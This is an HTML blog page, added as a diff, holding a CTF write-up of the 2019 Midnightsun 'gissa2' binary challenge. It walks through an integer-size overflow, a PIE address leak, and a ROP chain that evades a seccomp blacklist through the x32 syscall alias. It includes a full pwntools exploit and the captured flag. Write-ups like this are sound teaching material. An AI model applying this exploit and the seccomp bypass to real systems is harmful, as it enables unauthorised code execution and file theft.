@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Midnightsun CTF 2019 - gissa2 | kileak</title>
+
+
+
+
+
+<meta name="description" content="Midnightsun CTF 2019 - gissa2">
+
+
+<meta name="keywords" content="Midnightsun CTF 2019">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2019/midnight-gissa2/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Midnightsun CTF 2019 - gissa2</h1>
+      <p class="post-meta">Apr 6, 2019</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Points: 631
+Solves: 15
+<!--break-->
+Last year some dirty hackers found a way around my guessing challenge, well I patched the issue. Can you guess again?</p>
+</blockquote>
+
+<blockquote>
+  <p>Attachment: <a href="https://kileak.github.io/assets/midnight19/gissa/gissa_igen">gissa_igen</a> <a href="https://kileak.github.io/assets/midnight19/gissa/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> ▄▄█████████ ▄█████████ ▄▄█████████ ▄▄█████████ ▄▄████████▄ ▄████████▄ ▄▄████████▄
+ ████▀▀▀▀▀▀▀ ▀▀▀████▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ▀▀▀▀▀▀████ ███▀▀▀▀████
+ ████ ▄▄▄▄▄     ████    ████▄▄▄▄▄▄  ████▄▄▄▄▄▄  ████▄▄▄████  ▄▄▄▄▄███▀ ▀▀▀ ▄▄▄███▀
+ ████ ▀▀████    ████    ▀▀▀▀▀▀▀████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀     ████▀▀▀
+ ████▄▄▄████ ▄▄▄████▄▄▄ ▄▄▄▄▄▄▄████ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄    ▄▄▄▄
+ ███████████ ██████████ ██████████▀ ██████████▀ ████   ████ ██████████    ████
+ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀    ▀▀▀▀
+
+How good are you at guessing flags?
+
+flag (1/3): </code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
+ 0005: 0x06 0x00 0x00 0x00000000  return KILL
+ 0006: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0008
+ 0007: 0x06 0x00 0x00 0x00000000  return KILL
+ 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
+ 0009: 0x06 0x00 0x00 0x00000000  return KILL
+ 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+ 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
+ 0013: 0x06 0x00 0x00 0x00000000  return KILL
+ 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
+ 0015: 0x06 0x00 0x00 0x00000000  return KILL
+ 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
+ 0017: 0x06 0x00 0x00 0x00000000  return KILL
+ 0018: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0020
+ 0019: 0x06 0x00 0x00 0x00000000  return KILL
+ 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre></figure>
+
+<p>So, the binary lets us guess the flag, and we have three tries to get it right.</p>
+
+<p>When reversing the binary, you’ll quickly see, that it uses to <code class="language-plaintext highlighter-rouge">seccomp</code> to blacklist some syscalls, which might make it harder to exploit the binary later on.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">140</span><span class="p">];</span> 
+  <span class="kr">__int16</span> <span class="n">len_input</span> <span class="o">=</span> <span class="mi">139</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">current_try</span><span class="p">;</span> 
+  
+  <span class="n">current_try</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  
+  <span class="n">init_app_and_seccomp</span><span class="p">();</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"How good are you at guessing flags?</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">37</span><span class="p">);</span>
+  <span class="n">null_terminate</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">139</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">current_try</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"flag ("</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+    <span class="n">show_flag_count</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">current_try</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"/3): "</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">read_user_input</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">len_input</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">current_try</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>    
+  <span class="p">}</span>
+  <span class="n">cleanup</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The for loop looks pretty suspicious in the way it compares the count of tries.</p>
+
+<p>Taking a closer look at <code class="language-plaintext highlighter-rouge">len_input</code> and <code class="language-plaintext highlighter-rouge">current_try</code>, it occurs that both are 16 bit values, but when <code class="language-plaintext highlighter-rouge">read_user_input</code> is called, <code class="language-plaintext highlighter-rouge">len_input</code> will be casted to an <code class="language-plaintext highlighter-rouge">int</code> (<code class="language-plaintext highlighter-rouge">32 bit</code>). This will become handy in a moment.</p>
+
+<p><code class="language-plaintext highlighter-rouge">read_user_input</code> will read <code class="language-plaintext highlighter-rouge">size</code> bytes into <code class="language-plaintext highlighter-rouge">buffer</code> and then compares its content to the flag, which is <code class="language-plaintext highlighter-rouge">mmapped</code> to a memory region while the app is running. Though this <code class="language-plaintext highlighter-rouge">mmapped</code> region can completely be ignored, since it will be cleared and unmapped when we leave the for loop. Don’t think it’s possible to read the flag from there at all, but in the end we won’t need to do that anyways.</p>
+
+<p>Only thing worth noting, is that if we don’t give any input at all <code class="language-plaintext highlighter-rouge">current_try</code> will be increased, without losing a try.</p>
+
+<p>Let’s check what happens to <code class="language-plaintext highlighter-rouge">len_input</code> instead, when we try multiple times to guess the flag.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">flag (1/3): ─────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007fffffffdcc8  →  0x0000000000000000
+$rbx   : 0x0               
+$rcx   : 0x00007fffffffdd54  →  0x000000000000008b
+$rdx   : 0x00007fffffffdd56  →  0x0000000000000000
+$rsp   : 0x00007fffffffdcc0  →  0x0000555555554b61  →   cdqe 
+$rbp   : 0x0               
+$rsi   : 0x00007fffffffdd54  →  0x000000000000008b   &lt;== current_try / len_input
+$rdi   : 0x00007fffffffdcc8  →  0x0000000000000000
+$rip   : 0x000055555555491e  →   sub rsp, 0x48
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x0000555555554c47  →   ret 
+$r11   : 0x246             
+$r12   : 0x0000555555554bb7  →   sub rsp, 0x18
+$r13   : 0x00007fffffffdd90  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555554914                  add    BYTE PTR [rbx+0x481c2444], cl
+   0x55555555491a                  add    esp, 0x28
+   0x55555555491d                  ret    
+ → 0x55555555491e                  sub    rsp, 0x48
+   0x555555554922                  mov    QWORD PTR [rsp+0x18], rdi
+   0x555555554927                  mov    QWORD PTR [rsp+0x10], rsi
+   0x55555555492c                  mov    QWORD PTR [rsp+0x8], rdx
+   0x555555554931                  lea    rax, [rip+0x2016c8]        # 0x555555756000
+   0x555555554938                  mov    rax, QWORD PTR [rax]
+
+Breakpoint 1, 0x000055555555491e in ?? ()
+gef➤  </code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rdi</code> contains <code class="language-plaintext highlighter-rouge">0x8b</code>, which means, we can input 139 chars, exactly what we would expect from the previous source code.</p>
+
+<p>If we now just send an empty string, <code class="language-plaintext highlighter-rouge">current_tries</code> will be increased by one, and we get back into <code class="language-plaintext highlighter-rouge">read_user_input</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x00007fffffffdd38  →  0x0000000000000000
+$rbx   : 0x0               
+$rcx   : 0x00007fffffffddc4  →  0x000000000001008b
+$rdx   : 0x00007fffffffddc6  →  0x0000000000000001
+$rsp   : 0x00007fffffffdd30  →  0x0000555555554b61  →   cdqe 
+$rbp   : 0x0               
+$rsi   : 0x00007fffffffddc4  →  0x000000000001008b &lt;= current_tries / len_input
+$rdi   : 0x00007fffffffdd38  →  0x0000000000000000
+$rip   : 0x000055555555491e  →   sub rsp, 0x48
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x0000555555554c47  →   ret 
+$r11   : 0x246             
+$r12   : 0x0000555555554bb7  →   sub rsp, 0x18
+$r13   : 0x00007fffffffde00  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555554914                  add    BYTE PTR [rbx+0x481c2444], cl
+   0x55555555491a                  add    esp, 0x28
+   0x55555555491d                  ret    
+ → 0x55555555491e                  sub    rsp, 0x48
+   0x555555554922                  mov    QWORD PTR [rsp+0x18], rdi
+   0x555555554927                  mov    QWORD PTR [rsp+0x10], rsi
+   0x55555555492c                  mov    QWORD PTR [rsp+0x8], rdx
+   0x555555554931                  lea    rax, [rip+0x2016c8]        # 0x555555756000
+   0x555555554938                  mov    rax, QWORD PTR [rax]</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rdi</code> now contains <code class="language-plaintext highlighter-rouge">0x1008b</code> (16 bits <code class="language-plaintext highlighter-rouge">current_tries</code> and 16 bits from <code class="language-plaintext highlighter-rouge">len_input</code>), which means we can now read <code class="language-plaintext highlighter-rouge">65675</code> into <code class="language-plaintext highlighter-rouge">buffer</code> (which is only 140 chars big), so we have a nice buffer overflow at hand.</p>
+
+<p>With this, we can now overflow into <code class="language-plaintext highlighter-rouge">current_tries</code> and <code class="language-plaintext highlighter-rouge">len_input</code> itself, setting them to arbitrary values. But since the binary has <code class="language-plaintext highlighter-rouge">pie</code> enabled, we need some leaks first.</p>
+
+<p><code class="language-plaintext highlighter-rouge">read_user_input</code> will read either exactly <code class="language-plaintext highlighter-rouge">len_input</code> characters or we have to end the input with a newline, which will get replaced with a null byte. So in order to align our buffer poperly to leak the return address, we first have to overwrite <code class="language-plaintext highlighter-rouge">len_input</code> with the exact offset of the return address. Then we can send another string to fillup the buffer, so it will exactly end where the return address starts (<code class="language-plaintext highlighter-rouge">0xa0</code>), and then we can easily leak it, since the binary will tell us, that our input was wrong.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"gissa-igen-01.play.midnightsunctf.se"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">4096</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send empty try to increase input size"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"): "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite size with 0xa0 to align it with return address after next read"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">140</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"): "</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite buffer, so it gets aligned with return address"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="mi">140</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xa0</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"): "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">160</span><span class="p">)</span>
+  
+    <span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0xbb7</span>
+  
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIELEAK       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"BASE          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+  
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+  
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+  	
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./gissa_igen"</span><span class="p">)</span>
+  
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./gissa_igen"</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
+[!] Did not find any GOT entries
+[*] '/home/kileak/ctf/midnight/gissa/gissa_igen'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './gissa_igen': pid 20118
+[20118]
+[*] Paused (press any to continue)
+[*] Send empty try to increase input size
+[*] Overwrite size with 0xa0 to align it with return address after next read
+[*] Overwrite buffer, so it gets aligned with return address
+[*] PIELEAK       : 0x555555554bb7
+[*] BASE          : 0x555555554000</code></pre></figure>
+
+<p>With the base address we can now calculate the addresses of all rop gadgets needed to open and read the flag again, after it was removed by the binary.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbd9</span>
+<span class="n">POPRAXRDIRSI</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xc21</span>
+<span class="n">POPRDX98RDIRSI</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xc1d</span></code></pre></figure>
+
+<p>With these gadgets we can easily write a open/read/write chain to exfiltrate the flag.</p>
+
+<p>But this will fail, since <code class="language-plaintext highlighter-rouge">seccomp</code> is active, which blacklisted <code class="language-plaintext highlighter-rouge">open</code>, <code class="language-plaintext highlighter-rouge">openat</code>, <code class="language-plaintext highlighter-rouge">execve</code> and <code class="language-plaintext highlighter-rouge">execveat</code>.</p>
+
+<p>After searching for some other syscalls to use to read the flag instead, I remembered a nifty way to get around blacklisted syscalls.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">168</span>
+
+<span class="c1"># open("/home/ctf/flag", 0)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAXRDIRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40000002</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/home/ctf/flag"</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># read(0, e.bss()+100, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAXRDIRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX98RDIRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># write(1, e.bss()+100, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAXRDIRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Using syscall <code class="language-plaintext highlighter-rouge">0x40000002</code> will also result in calling <code class="language-plaintext highlighter-rouge">open</code>, but <code class="language-plaintext highlighter-rouge">seccomp</code> will fail to catch it, thus rewarding us with the flag :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[!] Did not find any GOT entries
+[*] '/home/kileak/ctf/midnight/gissa/gissa_igen'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to gissa-igen-01.play.midnightsunctf.se on port 4096: Done
+[*] Send empty try to increase input size
+[*] Overwrite size with 0xa0 to align it with return address after next read
+[*] Overwrite buffer, so it gets aligned with return address
+[*] PIELEAK       : 0x555fdbc7abb7
+[*] BASE          : 0x555fdbc7a000
+[*] Send ropchain to open file and read it again
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\xac��_ is not right.
+midnight{I_kN3w_1_5H0ulD_h4v3_jUst_uS3d_l1B5eCC0mP}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00timeout: the monitored command dumped core
+/home/ctf/redir.sh: line 4: 11728 Segmentation fault      timeout -k 120 120 ./chall
+[*] Got EOF while reading in interactive</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Midnightsun CTF 2019 - gissa2&amp;url=https://kileak.github.io/ctf/2019/midnight-gissa2/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/midnight-gissa2/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2019/midnight-gissa2';
+        var disqus_title = 'Midnightsun CTF 2019 - gissa2';
+        var disqus_url = 'https://kileak.github.io/ctf/2019/midnight-gissa2';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
